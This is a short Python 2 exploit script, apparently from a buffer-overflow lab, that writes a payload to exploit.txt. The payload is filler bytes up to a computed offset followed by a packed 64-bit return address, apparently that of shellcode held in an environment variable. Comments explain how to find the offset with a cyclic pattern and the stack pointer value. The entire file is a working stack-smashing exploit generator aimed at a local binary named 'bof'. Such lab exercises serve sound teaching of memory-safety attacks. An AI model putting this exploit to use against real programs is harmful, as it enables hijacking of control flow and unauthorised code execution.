#!/usr/bin/env python

# usage: ./exploit2.py $offset $(./get_end_addr SHXP ./bof | cut -f 5 -d' ') && cat exploit.txt

# a=$(cat pattern.txt)
# b={replace with rsp starting value found with the previous command
# offset=$(echo $a | grep -b -o $b | cut -d ':' -f 1)

import sys
from struct import *
offset= int(sys.argv[1] if len(sys.argv) > 1 else 0)
addr=int(sys.argv[2], 16)
buf = ""
buf += "\x2a"*offset
buf += pack("<Q", addr)
#buf += "\x2a"*512
print "writing " + buf + " to exploit.txt"
with open("exploit.txt", "w") as f:
     f.write(buf)
     f.close
